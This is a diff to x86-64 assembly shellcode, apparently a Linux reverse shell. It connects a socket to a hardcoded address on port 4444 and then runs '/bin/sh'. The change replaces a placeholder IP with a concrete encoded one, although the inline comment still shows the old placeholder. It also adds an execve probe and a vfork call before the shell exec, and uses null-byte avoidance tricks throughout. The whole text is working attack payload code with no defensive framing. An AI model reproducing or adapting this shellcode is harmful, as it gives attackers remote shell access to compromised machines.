@@ -31,7 +31,8 @@ start:
 	mov r12, rax 				; Save the socket
 
 ;Sock_addr
-	mov r13, 0xFFFFFFFF5C110101 ; IP = FFFFFFFF, Port = 5C11(4444)
+	;mov r13, 0xFFFFFFFF5C110101 ; IP = FFFFFFFF, Port = 5C11(4444)
+	mov r13, 0x0345450A5C110101 ; IP = FFFFFFFF, Port = 5C11(4444)
 	mov r9b, 0xFF				; The sock_addr_in is + FF from where we need it
 	sub r13, r9					; So we sub 0xFF from it to get the correct value and avoid a null
 	push r13					; Push it on the stack
@@ -61,7 +62,23 @@ dup:
 	sub r8, 0x1F				; setup the exec syscall at 0x3b
 	mov rax, r8					; move the syscall into rax
 
-;exec:
+;exec
+	xor rdx, rdx				; zero out 3rd arg
+	xor rsi, rsi				; zero out 2nd arg
+	xor rdi, rdi				; zero out 1st arg
+	syscall						; call execve(NULL,NULL,NULL)
+
+	cmp rax, rdi				; compare rax to 0
+	je exec						; jmp if = 0
+	
+;vfork
+	add r8, 0x7					; 7 + 3B = 42 = vfork syscall
+	mov rax, r8
+	sub r8, 0x7					; put 3B back in rax
+	syscall						; call vfork();
+
+exec:
+	mov rax, r8
     xor rdx, rdx 				; zero out rdx
 	mov r13, 0x68732f6e69622fFF ; '/bin/sh' in hex
 	shr r13, 8					; shift right to create the null terminator
